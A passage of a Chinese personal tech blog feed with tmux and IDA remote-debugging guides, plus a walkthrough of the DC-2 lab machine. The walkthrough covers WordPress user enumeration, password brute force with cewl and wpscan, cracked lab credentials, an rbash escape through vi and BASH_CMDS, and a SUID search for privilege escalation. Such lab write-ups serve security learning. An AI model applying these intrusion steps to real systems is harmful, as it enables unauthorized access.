align="center"><code>Ctrl+b</code></td><td align="center"><code>&#123;</code></td><td align="center">向前置换当前面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>&#125;</code></td><td align="center">向后置换当前面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+o</code></td><td align="center">顺时针旋转当前窗口中的所有面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>方向键</code></td><td align="center">移动光标切换面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>o</code></td><td align="center">选择下一面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>空格键</code></td><td align="center">在自带的面板布局中循环切换</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Alt+方向键</code></td><td align="center">以5个单元格为单位调整当前面板边缘</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+方向键</code></td><td align="center">以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>t</code></td><td align="center">显示时钟</td></tr></tbody></table><p>怎么看我都觉得太复杂了，还是跟着大佬自定义一下吧。</p><h2 id="3-3-自定义tmux快捷键"><a href="#3-3-自定义tmux快捷键" class="headerlink" title="3.3 自定义tmux快捷键"></a>3.3 自定义tmux快捷键</h2><h3 id="修改前缀命令"><a href="#修改前缀命令" class="headerlink" title="修改前缀命令"></a>修改前缀命令</h3><p>相信只要你用过几次tmux，就会发现<code>Ctrl+b</code>指令前缀，着实不太方便。这两个键相距太远，按键成本太高了。因此我们首先需要将它更换为距离更近的<code>Ctrl+a</code>组合键，或者不常用的 &#96; 键（当然其他键也是可以的）。</p><p>tmux的用户级配置文件为<code>~/.tmux.conf</code>（没有的话就创建一个），修改快捷指令，只需要增加如下三行即可。</p><blockquote><p>set -g prefix C-a<br>unbind C-b      #C-b即Ctrl+b组合键，unbind意味着解除绑定<br>bind C-a send-prefix    #绑定Ctrl+a为新的指令前缀</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405182054654.png" alt="image-20240518205445625"></p><h3 id="修改新增面板指令"><a href="#修改新增面板指令" class="headerlink" title="修改新增面板指令"></a>修改新增面板指令</h3><p>tmux中，使用最多的功能之一就是新增一个面板。</p><p>水平方向新增面板的指令是 <code>prefix</code> + <code>&quot;</code> ，垂直方向是 <code>prefix</code> + <code>%</code>，<code>&quot;</code> 和 <code>%</code>需要两个键同时按下才能完成，加上指令前缀至少需要3~4次按键才能组成一个完整的指令，同时这个两个键也不够醒目和方便，</p><p>因此我们可以绑定两个更常用的指令 <code>-</code>、<code>|</code>，如下所示：</p><blockquote><p>unbind ‘“‘ </p><p>bind - splitw -v -c ‘#{pane_current_path}’ # 垂直方向新增面板，默认进入当前目录 </p><p>unbind % </p><p>bind | splitw -h -c ‘#{pane_current_path}’ # 水平方向新增面板，默认进入当前目录</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405182056393.png" alt="image-20240518205634364"></p><h3 id="修改面板切换指令"><a href="#修改面板切换指令" class="headerlink" title="修改面板切换指令"></a>修改面板切换指令</h3><p>虽然指令前缀加<code>方向键</code>可以切换面板，但<code>方向键</code>太远，不够快，不够Geek。没关系，我们可以将面板切换升级为熟悉的<code>h</code>、<code>j</code>、<code>k</code>、<code>l</code>键位。</p><blockquote><p># 绑定hjkl键为面板切换的上下左右键 </p><p>bind -r k select-pane -U # 绑定k为↑ </p><p>bind -r j select-pane -D # 绑定j为↓ </p><p>bind -r h select-pane -L # 绑定h为← </p><p>bind -r l select-pane -R # 绑定l为→</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405182100583.png" alt="image-20240518210004543"></p><h3 id="修改面板大小调整指令"><a href="#修改面板大小调整指令" class="headerlink" title="修改面板大小调整指令"></a>修改面板大小调整指令</h3><p>习惯了全键盘操作后，命令的便捷性不言而喻。既然面板切换的指令都可以升级，面板大小调整的指令自然也不能落后。如下配置就可以升级你的操作：</p><blockquote><p># 绑定Ctrl+hjkl键为面板上下左右调整边缘的快捷指令 </p><p>bind -r ^k resizep -U 10 # 绑定Ctrl+k为往↑调整面板边缘10个单元格 </p><p>bind -r ^j resizep -D 10 # 绑定Ctrl+j为往↓调整面板边缘10个单元格 </p><p>bind -r ^h resizep -L 10 # 绑定Ctrl+h为往←调整面板边缘10个单元格 </p><p>bind -r ^l resizep -R 10 # 绑定Ctrl+l为往→调整面板边缘10个单元格</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405182102877.png" alt="image-20240518210218838"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上述修改的指令都是比较常用的指令其他不常用的指令等以后用到的时候在查资料进行修改，更改的指令如下表表格所示：</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+a</code></td><td align="center">-</td><td align="center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">|</td><td align="center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">j</td><td align="center">往↓切换面板</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">k</td><td align="center">往↑切换面板</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">h</td><td align="center">往←切换面板</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">l</td><td align="center">往→切换面板</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">Ctrl+j</td><td align="center">往↓调整面板边缘10个单元格</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">Ctrl+k</td><td align="center">往↑调整面板边缘10个单元格</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">Ctrl+h</td><td align="center">往←调整面板边缘10个单元格</td></tr><tr><td align="center"><code>Ctrl+a</code></td><td align="center">Ctrl+l</td><td align="center">往→调整面板边缘10个单元格</td></tr></tbody></table><h1 id="4-其他相关设置"><a href="#4-其他相关设置" class="headerlink" title="4. 其他相关设置"></a>4. 其他相关设置</h1><h2 id="4-1-tmux终端默认zsh"><a href="#4-1-tmux终端默认zsh" class="headerlink" title="4.1 tmux终端默认zsh"></a>4.1 tmux终端默认zsh</h2><p>在<code>.tmux.conf</code>文件中添加以下内容</p><blockquote><p>set -g default-shell &#x2F;bin&#x2F;zsh</p></blockquote><h2 id="4-2-设置终端默认tmux"><a href="#4-2-设置终端默认tmux" class="headerlink" title="4.2 设置终端默认tmux"></a>4.2 设置终端默认tmux</h2><blockquote><p> chsh -s &#x2F;usr&#x2F;bin&#x2F;tmux</p><p>如果要切换回去bash</p><p>chsh -s &#x2F;bin&#x2F;bash</p></blockquote><p>参考链接：<a href="https://louiszhai.github.io/2017/09/30/tmux/">Tmux使用手册 | louis blog (louiszhai.github.io)</a></p><p>参考链接：<a href="https://louiszhai.github.io/2017/09/30/tmux/">Tmux使用手册 | louis blog (louiszhai.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
      <tag>工具配置</tag>
      
      <tag>美化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA远程动态调试</title>
    <link href="/2024/05/18/IDA%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <url>/2024/05/18/IDA%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="1-远程运行服务"><a href="#1-远程运行服务" class="headerlink" title="1. 远程运行服务"></a>1. 远程运行服务</h1><p>在Windows主机的IDA根目录的<code>dbgsrv</code>文件夹找到<code>linux_server64</code>复制到远程的Linux系统中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x linux_server64//赋予可执行权限<br></code></pre></td></tr></table></figure><p>在远程的linux系统中运行IDA服务文件<code>linux_server64</code>并保持运行状态。</p><blockquote><p>.&#x2F;linux_server64 -p 12345<br>-p 12345: 指修改监听端口为12345，默认监听端口为23964；</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405181706715.png" alt="image-20240518170602688"></p><h1 id="2-本地IDA远程连接"><a href="#2-本地IDA远程连接" class="headerlink" title="2. 本地IDA远程连接"></a>2. 本地IDA远程连接</h1><p>打开IDA新建远程连接项目【Debugger】-&gt;【Run】-&gt;【Remote Linux debugger】</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405181704851.png" alt="image-20240518170417812"></p><p>应用程序Application: 填写需要调试的文件在远程主机的绝对路径<br>目录Directory ：填写需要运行的程序在远程主机的目录<br>主机名Hostname：填写远程主机的ip地址<br>端口Port:填写linux_server64服务开启的监听端口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405181708538.png" alt="image-20240518165918608"><br>最后直接完成ok进行调试即可。</p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
      <tag>工具配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>考研初始经验分享</title>
    <link href="/2024/05/17/%E8%80%83%E7%A0%94%E5%88%9D%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
    <url>/2024/05/17/%E8%80%83%E7%A0%94%E5%88%9D%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="21c657d787c03593d5ea0e8b21a449c80a5156280bb95e6a005814753a92b498"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">~ 猜猜密码是什么? ^_^ ~</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>考研</category>
      
    </categories>
    
    
    <tags>
      
      <tag>经验分享</tag>
      
      <tag>考研</tag>
      
      <tag>encrypted</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-2打靶日记</title>
    <link href="/2024/05/09/dc-2%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/05/09/dc-2%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确定目标IP地址"><a href="#1-1-确定目标IP地址" class="headerlink" title="1.1 确定目标IP地址"></a>1.1 确定目标IP地址</h2><p>根据开关靶机确定目标机器的ip地址</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082104733.png" alt="image-20240508210424698"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082111702.png" alt="image-20240508211147648"></p><p>根据两次存活主机排查可以知道靶场的IP是<code>192.168.31.105</code></p><h2 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h2><ol><li>开放端口扫描</li></ol><blockquote><p>nmap -sT –min-rate 10000 -p- 192.168.31.105 -oA nmapscan&#x2F;dc-2ports</p></blockquote><p><code>-sT</code>: 使用tcp三次握手的过程进行探测端口是否开放（相对较慢，但相对准确）；</p><p><code>-sS</code>: 默认扫描方式，通过syn标志位进行检测连接是否开放（容易被防火墙挡住）；</p><p><code>-oA</code>：以全格式保存在后续的地址文件中，以三种不同的后缀文件名保存；</p><p><code>--min-rate</code>: 指定扫描的速度，在正式的护网中要比10000还慢；</p><p><code>-p</code>：指定扫描端口，<code>-p-</code>指的是从1到65535端口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082113626.png" alt="image-20240508211317606"></p><p>可以看到打开的端口数量为2个，分别为80,7744</p><ol start="2"><li>开放端口详细扫描</li></ol><blockquote><p>sudo nmap -sT -sV -sC -O -p80,7744 192.168.31.105 -oA nmapscan&#x2F;portsdetail</p></blockquote><p><code>-sV</code>：扫描提供服务的版本</p><p><code>-sC</code>：用默认的脚本进行扫描</p><p><code>-O</code>：扫描操作系统的版本</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082114234.png" alt="image-20240508211453201"></p><p>根据开放端口的详细信息可以知道</p><blockquote><p>端口7744</p><p>服务：ssh版本：OpenSSH 6.7p1Debian 5+deb8u7 (protocol 2.0)</p></blockquote><blockquote><p>端口80</p><p>服务：httpApache httpd 2.4.10 ((Debian))</p></blockquote><p>其他就没有扫出太多的信息，包括一些目录什么的也没有；</p><h1 id="2-gobuster目录爆破"><a href="#2-gobuster目录爆破" class="headerlink" title="2. gobuster目录爆破"></a>2. gobuster目录爆破</h1><p>由于在端口搜索的时候发现的东西并不太多，所以我们通过目录爆破尝试获取一些其他信息；</p><blockquote><p>sudo gobuster dir -u <a href="http://192.168.31.105/">http://192.168.31.105</a> –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082125165.png" alt="image-20240508212502130"></p><p>目录爆破完成，对所有网页进行访问</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082125397.png" alt="image-20240508212549357"></p><p>这是唯一一个能够访问的界面，其他两个并不能够访问，也获取不到什么有用的信息。通过这个界面也获取不到什么非常有用的东西，尝试。</p><h1 id="3-重定向修改访问"><a href="#3-重定向修改访问" class="headerlink" title="3. 重定向修改访问"></a>3. 重定向修改访问</h1><p>由于每次访问靶机ip地址都会被重定向到域名dc-2，所以应该是做了重定向处理，我们对本机的host文件进行修改，尝试定位会源靶机主页。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082129663.png" alt="image-20240508212903630"></p><p>想host文件添加以下内容后，在对<code>192.168.31.105</code>进行访问，可得其正确访问主页</p><blockquote><p>192.168.31.105dc-2</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082131528.png" alt="image-20240508213140274"></p><p>访问到主页后根据指纹工具的识别可以得出其技术构成等信息</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082134895.png" alt="image-20240508213411869"></p><p>可以得到的信息有</p><blockquote><p>WordPress 4.7.10</p><p>php语言</p><p>Mysql数据库</p><p>jQuery Migrate 1.4.1</p><p>jQuery 1.12.4</p></blockquote><h1 id="4-WordPress漏洞"><a href="#4-WordPress漏洞" class="headerlink" title="4. WordPress漏洞"></a>4. WordPress漏洞</h1><p>根据上述得到的信息可以进行CMS的漏洞搜索和尝试获取shell，使用Metasploit工具搜索器漏洞，印象中这个CMS漏洞特别多</p><blockquote><p>msfconsole</p><p>search wordpress</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082142961.png" alt="image-20240508214210877"></p><p>可见确实有特别多，但是有些我们并没有利用条件</p><p>例如，下面这个，我们并没有订阅的用户名和密码</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082143722.png" alt="image-20240508214309675"></p><p>又例如这个，我们所有条件都满足但是却没法成功利用的</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082149689.png" alt="image-20240508214901659"></p><p>尝试多个，也没法成功利用</p><h1 id="5-flag-1"><a href="#5-flag-1" class="headerlink" title="5. flag 1"></a>5. flag 1</h1><p>对于刚才进入的主页，仔细观察可以发现下面有个<code>flag</code>标签，应该对应着什么信息。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405082153384.png" alt="image-20240508215310302"></p><blockquote><p><strong>Flag 1:</strong></p><p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p><p>More passwords is always better, but sometimes you just can’t win them all.</p><p>Log in as one to see the next flag.</p><p>If you can’t find it, log in as another.</p><p>解释：</p><p>你常用的字典可能不会起作用，因此，可能你需要cewl</p><p>更多密码肯定会更好，但是有时并不能获得所有的密码</p><p>作为一个用户去登录查看下一个flag</p><p>如果不能看到flag，那就登录另一个用户</p></blockquote><p>通过百度查询以下<code>cewl</code>的使用方法，得出以下内容：<a href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南 - FreeBuf网络安全行业门户</a></p><blockquote><p>ewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p><p>帮助命令：cewl -h</p><p>默认方法：cewl <a href="http://www.ignitetechnologies.in/">http://www.ignitetechnologies.in/</a></p><p>保存字典文件：cewl <a href="http://www.ignitetechnologies.in/">http://www.ignitetechnologies.in/</a> -w dict.txt</p></blockquote><p>我们尝试通过最基本的命令进行字典的获取，由于ip地址被重定向了，通过域名访问即可得到相应爬虫字典</p><blockquote><p>cewl <a href="http://dc-2/">http://dc-2</a> -w cewlDict.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405091921748.png" alt="image-20240509192131666"></p><p>根据cewl的介绍我们可以知道，这大概率是密码字典，有了密码我们还需要找相应的账号和登录界面</p><p>之前的目录爆破结果得到的目录有，此前是因为ip地址重定向导致了网页无法访问，现在我们应该修改了相应的地址，应该可以正常访问</p><blockquote><p>&#x2F;wp-content</p><p>&#x2F;wp-includes</p><p>&#x2F;wp-admin</p></blockquote><p><code>/wp-content</code>目录依旧无法进入，<code>/wp-admin</code>目录进入后跳转到登录界面，那么现在我们的问题就只剩下寻找用户名了。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405091926250.png" alt="image-20240509192606200"></p><h1 id="6-wpscan扫描"><a href="#6-wpscan扫描" class="headerlink" title="6. wpscan扫描"></a>6. wpscan扫描</h1><blockquote><p><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。我们还使用了 <code>Nikto</code> ，它是一款非常棒的<code>Web</code> 服务器评估工具，我们认为这个工具应该成为所有针对 <code>WordPress</code>网站进行的渗透测试的一部分</p></blockquote><h2 id="6-1-wpscan扫描wordpress有效用户"><a href="#6-1-wpscan扫描wordpress有效用户" class="headerlink" title="6.1 wpscan扫描wordpress有效用户"></a>6.1 wpscan扫描wordpress有效用户</h2><p>通过扫描在wordpress中有效的用户，确定用户的用户名，从而使用密码字典进行爆破</p><blockquote><p>wpscan –url <a href="http://dc-2/">http://dc-2/</a> -e u</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405091933586.png" alt="image-20240509193329539"></p><p>将用户名保存在相应字典中，继续使用wpscan爆破用户名和密码</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405091934757.png" alt="image-20240509193452725"></p><h2 id="6-2-爆破用户名密码"><a href="#6-2-爆破用户名密码" class="headerlink" title="6.2 爆破用户名密码"></a>6.2 爆破用户名密码</h2><p>使用获取到的用户名字典和密码字典进行爆破，获取可登录账户</p><blockquote><p>wpscan –url <a href="http://dc-2/">http://dc-2/</a> -U usersname.txt -P cewlDict.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405091941391.png" alt="image-20240509194157351"></p><p>可以看到成功爆破出两个用户名的密码，通过使用这两个用户名登录系统</p><blockquote><p>jerry &#x2F; adipiscing</p><p>tom &#x2F; parturient</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405091943849.png" alt="image-20240509194350784"></p><p>两个用户名和密码均成功登录管理系统，在这里可以获得的信息是这个wordpress CMS的版本是<code>6.5.3</code></p><h1 id="7-flag2"><a href="#7-flag2" class="headerlink" title="7. flag2"></a>7. flag2</h1><p>在jerry的pages栏下发现了flag2，简单查看一下flag2的内容；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405091948925.png" alt="image-20240509194818863"></p><blockquote><p>解释：</p><p>如果你不能利用WordPress并走捷径，还有另一种方法。</p><p>希望你找到了另一个入口。</p></blockquote><p>它似乎想告诉我们可能利用wordpress的路径是实现不了的，这也就验证了上述通过metasploit利用wordpress漏洞行不通的原因了</p><h1 id="8-ssh连接"><a href="#8-ssh连接" class="headerlink" title="8. ssh连接"></a>8. ssh连接</h1><p>我们获得了两个账号密码，可以尝试使用他们连接服务器呀，服务器的端口改成了7744，但是开启的依旧是ssh服务</p><ol><li>jerry账号登录，三次都无法成功，可以排除密码输入错误的情况</li></ol><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092037641.png" alt="image-20240509203715602"></p><ol start="2"><li><p>tom账号登录，成功登录</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092038200.png" alt="image-20240509203809169"></p><p>查看当前目录发现有flag3</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092039490.png" alt="image-20240509203920460"></p><p>尝试读取flag3，发现没有cat命令，应该是命令限制</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092040033.png" alt="image-20240509203959012"></p><p>查看能够使用的命令</p><blockquote><p>compgen -c       &#x2F;&#x2F;查看可以使用的指令</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092041219.png" alt="image-20240509204142157"></p><p>发现可使用的命令中有<code>vi</code>，直接使用vi打开flag3.txt查看其内容</p><blockquote><p>vi flag3.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092042689.png" alt="image-20240509204246658"></p><blockquote><p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p></blockquote></li></ol><p>根据flag3的内容可以知道，tom权限不足，应该去提升权限到root</p><h1 id="9-提权"><a href="#9-提权" class="headerlink" title="9. 提权"></a>9. 提权</h1><p>根据上述查询到的信息可知，我们能够使用的命令有以下命令，通过以下命令进行提权操作；</p><blockquote><p>if<br>then<br>else<br>elif<br>fi<br>case<br>esac<br>for<br>select<br>while<br>until<br>do<br>done<br>in<br>function<br>time<br>{<br>}<br>!<br>[[<br>]]<br>coproc<br>__expand_tilde_by_ref</p><p>__get_cword_at_cursor_by_ref<br>__git_eread</p><p>__git_ps1<br>__git_ps1_colorize_gitstring</p><p>__git_ps1_show_upstream<br>__grub_dir</p><p>__grub_get_last_option<br>__grub_get_options_from_help</p><p>__grub_get_options_from_usage<br>__grub_list_menuentries</p><p>__grub_list_modules<br>__grubcomp</p><p>__ltrim_colon_completions<br>__parse_options</p><p>__reassemble_comp_words_by_ref<br>_a2disconf<br>_a2dismod<br>_a2dissite<br>_a2enconf<br>_a2enmod<br>_a2ensite<br>_allowed_groups<br>_allowed_users<br>_apache2_allcomp<br>_apache2_conf<br>_apache2_mods<br>_apache2_sites<br>_available_interfaces<br>_cd<br>_cd_devices<br>_command<br>_command_offset<br>_complete_as_root<br>_completion_loader<br>_configured_interfaces<br>_count_args<br>_debconf_show<br>_dvd_devices<br>_expand<br>_filedir<br>_filedir_xspec<br>_fstypes<br>_get_comp_words_by_ref<br>_get_cword<br>_get_first_arg<br>_get_pword<br>_gids<br>_grub_editenv<br>_grub_install<br>_grub_mkconfig<br>_grub_mkfont<br>_grub_mkimage<br>_grub_mkpasswd_pbkdf2<br>_grub_mkrescue<br>_grub_probe<br>_grub_script_check<br>_grub_set_entry<br>_grub_setup<br>_have<br>_init_completion<br>_insserv<br>_installed_modules<br>_ip_addresses<br>_kernel_versions<br>_known_hosts<br>_known_hosts_real<br>_longopt<br>_mac_addresses<br>_minimal<br>_modules<br>_ncpus<br>_parse_help<br>_parse_usage<br>_pci_ids<br>_pgids<br>_pids<br>_pnames<br>_pygmentize<br>_quote_readline_by_ref<br>_realcommand<br>_rl_enabled<br>_root_command<br>_service<br>_services<br>_shells<br>_signals<br>_split_longopt<br>_sysvdirs<br>_terms<br>_tilde<br>_uids<br>_update_initramfs<br>_upvar<br>_upvars<br>_usb_ids<br>_user_at_host<br>_usergroup<br>_userland<br>_variables<br>_xfunc<br>_xinetd_services<br>dequote<br>quote<br>quote_readline<br>.<br>:<br>[<br>alias<br>bg<br>bind<br>break<br>builtin<br>caller<br>cd<br>command<br>compgen<br>complete<br>compopt<br>continue<br>declare<br>dirs<br>disown<br>echo<br>enable<br>eval<br>exec<br>exit<br>export<br>false<br>fc<br>fg<br>getopts<br>hash<br>help<br>history<br>jobs<br>kill<br>let<br>local<br>logout<br>mapfile<br>popd<br>printf<br>pushd<br>pwd<br>read<br>readarray<br>readonly<br>return<br>set<br>shift<br>shopt<br>source<br>suspend<br>test<br>times<br>trap<br>true<br>type<br>typeset<br>ulimit<br>umask<br>unalias<br>unset<br>wait<br>less<br>scp<br>ls<br>vi</p></blockquote><p>根据网络查询到的资料可以得知，vim编译器是可以实现提权的，照例来说，vi和vim相似，可以尝试</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092101378.png" alt="image-20240509210126284"></p><p>使用<code>vi</code>命令随便打开一个文件，然后以保存关闭文件类似的方式输入以下命令</p><blockquote><p>:set shell&#x3D;&#x2F;bin&#x2F;sh</p><p>:shell</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092103672.png" alt="image-20240509210304635"></p><p>可见虽然没有实现完全提权，但已经实现了部分提权，能够访问jerry和tom文件夹了</p><p>进入jerry文件夹，发现这里存在flag4.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092105731.png" alt="image-20240509210510696"></p><p>访问flag4.txt文件可以看到</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092104795.png" alt="image-20240509210450761"></p><blockquote><p>Good to see that you’ve made it this far - but you’re not home yet.</p><p>You still need to get the final flag (the only flag that really counts!!!).</p><p>No hints here - you’re on your own now.  :-)</p><p>Go on - git outta here!!!!</p></blockquote><p>这个flag告诉我们，我们还没有home，我们仍然需要去找到最后一个flag，继续提权</p><p>通过网络查询找到一个绕过rbash的方式，通过设置环境变量绕过rbash</p><blockquote><p>什么是 RBASH</p><ul><li>RBASH 是 Restricted BASH 的缩写，意思是受限制的 BASH。</li><li>RBASH 是一种特殊的 shell，它限制了用户的一些操作和权限，例如：<ul><li>不能使用 cd 命令来改变当前目录。</li><li>不能使用 set 命令来改变环境变量或 shell 选项。</li><li>不能使用 unset 命令来取消环境变量或 shell 函数。</li><li>不能使用任何包含 &#x2F; 符号的命令，除非它们在 PATH 环境变量中指定了。</li><li>不能重定向输入或输出，例如使用 &gt;, &lt;, &gt;&gt;, &lt;&lt; 等符号。</li><li>只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。</li></ul></li><li>RBASH 的目的是为了提高系统的安全性，防止用户执行一些危险或不合法的操作。</li></ul></blockquote><blockquote><p>export -p        &#x2F;&#x2F;查看环境变量<br>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a         &#x2F;&#x2F;把&#x2F;bin&#x2F;sh给a<br>&#x2F;bin&#x2F;bash<br>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;         &#x2F;&#x2F;添加环境变量<br>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin      &#x2F;&#x2F;添加环境变量</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092117819.png" alt="image-20240509211718764"></p><p>通过设置环境变量，再次查看能够使用的命令可知，已经成功绕过了rbash；</p><p>但是通过尝试执行提权可知，依旧没有root权限，继续提权，寻找能够提权的指令进行提权</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405092119900.png" alt="image-20240509211904860"></p><p>利用find命令，找查具有SUID权限的可执行二进制文件</p><blockquote><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></blockquote><p><img 